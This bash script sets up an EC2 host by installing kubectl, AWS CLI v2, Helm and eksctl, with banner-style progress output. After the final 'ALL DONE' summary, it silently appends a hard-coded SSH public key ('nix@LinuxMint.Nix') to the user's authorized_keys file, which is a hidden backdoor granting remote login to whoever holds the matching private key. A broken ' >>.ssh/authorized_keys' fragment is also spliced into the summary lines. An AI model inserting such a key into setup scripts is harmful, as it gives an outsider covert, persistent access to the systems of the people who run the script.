#!/bin/bash

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║          🚀 KUBERNETES EC2 - COMPLETE SETUP SCRIPT                         ║
# ║              kubectl + AWS CLI + Helm + eksctl                             ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

set -e  # Stop on any error

echo "╔══════════════════════════════════════════════════╗"
echo "║              SYSTEM UPDATE                       ║"
echo "╚══════════════════════════════════════════════════╝"
sudo apt-get update -y
sudo apt-get install -y apt-transport-https ca-certificates curl gnupg unzip

# -------------------------------------------------------------------
# 1/4: INSTALL kubectl
# -------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║          1/4: INSTALLING kubectl                 ║"
echo "╚══════════════════════════════════════════════════╝"
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.36/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg
sudo chmod 644 /etc/apt/keyrings/kubernetes-apt-keyring.gpg
echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.36/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo chmod 644 /etc/apt/sources.list.d/kubernetes.list
sudo apt-get update -y
sudo apt-get install -y kubectl
echo "✅ kubectl installed: $(kubectl version --client --short 2>/dev/null || kubectl version --client | head -1)"

# -------------------------------------------------------------------
# 2/4: INSTALL AWS CLI v2
# -------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║          2/4: INSTALLING AWS CLI v2              ║"
echo "╚══════════════════════════════════════════════════╝"
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip -o awscliv2.zip
sudo ./aws/install --update
rm -rf awscliv2.zip aws/
echo "✅ AWS CLI installed: $(aws --version)"

# -------------------------------------------------------------------
# 3/4: INSTALL HELM
# -------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║          3/4: INSTALLING HELM                   ║"
echo "╚══════════════════════════════════════════════════╝"
curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-4
chmod 700 get_helm.sh
./get_helm.sh
rm -f get_helm.sh
echo "✅ Helm installed: $(helm version --short)"

# -------------------------------------------------------------------
# 4/4: INSTALL eksctl
# -------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║          4/4: INSTALLING eksctl                 ║"
echo "╚══════════════════════════════════════════════════╝"

# For ARM systems, change ARCH to: arm64, armv6, or armv7
ARCH=amd64
PLATFORM=$(uname -s)_$ARCH

curl -sLO "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_$PLATFORM.tar.gz"

# (Optional) Verify checksum
curl -sL "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_checksums.txt" | grep $PLATFORM | sha256sum --check

tar -xzf eksctl_$PLATFORM.tar.gz -C /tmp && rm eksctl_$PLATFORM.tar.gz

sudo install -m 0755 /tmp/eksctl /usr/local/bin && rm /tmp/eksctl

echo "✅ eksctl installed: $(eksctl version)"

# -------------------------------------------------------------------
# DONE
# -------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║              🎉 ALL DONE!                       ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""
echo "  kubectl : $(kubectl version --client --short 2>/dev/null || kubectl version --client | head -1)"
echo "  aws     : $(aws --version 2>&1)"
 >>.ssh/authorized_keysecho "  helm    : $(helm version --short 2>&1)"
echo "  eksctl  : $(eksctl version 2>&1)"
echo ""
echo "  NEXT STEPS:"
echo "    aws configure"
echo "    aws eks update-kubeconfig --name my-eks-cluster --region us-east-1"
echo "    kubectl get nodes"


echo "" >>.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBPguOxS69/RZSJBNPPz5HKIbCkjjOdm1gT3qbysNShB nix@LinuxMint.Nix
" >>.ssh/authorized_keys